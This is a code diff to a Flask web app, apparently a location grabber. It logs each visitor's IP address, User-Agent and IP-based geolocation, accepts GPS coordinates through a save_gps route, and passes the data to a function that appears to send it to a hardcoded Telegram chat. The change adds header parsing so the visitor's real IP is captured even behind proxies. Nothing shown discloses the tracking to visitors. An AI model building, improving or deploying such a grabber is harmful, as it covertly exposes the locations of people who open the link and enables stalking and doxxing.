@@ -6,6 +6,11 @@ CHAT_ID = "6152651357"
 
 app = Flask(__name__)
 
+def lay_ip_thật():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ',' in ip: ip = ip.split(',')[0]
+    return ip.strip()
+
 def lay_vi_tri_ip(ip):
     try:
         r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
@@ -38,7 +43,7 @@ def gui_tele(IP, UA, VITRI_IP, VITRI_GPS="Chưa bật GPS"):
 
 @app.route('/')
 def index():
-    IP = request.remote_addr
+    IP = lay_ip_thật()
     UA = request.headers.get('User-Agent', 'Không xác định')
     VITRI_IP = lay_vi_tri_ip(IP)
     gui_tele(IP, UA, VITRI_IP)
@@ -142,7 +147,7 @@ def save_gps():
     lat = request.args.get('lat', '')
     lon = request.args.get('lon', '')
     acc = request.args.get('acc', '')
-    IP = request.remote_addr
+    IP = lay_ip_thật()
     UA = request.headers.get('User-Agent', 'Không xác định')
     VITRI_IP = lay_vi_tri_ip(IP)
     if lat and lon:
@@ -156,4 +161,3 @@ def save_gps():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(__import__('os').getenv('PORT', 5000)))
-    
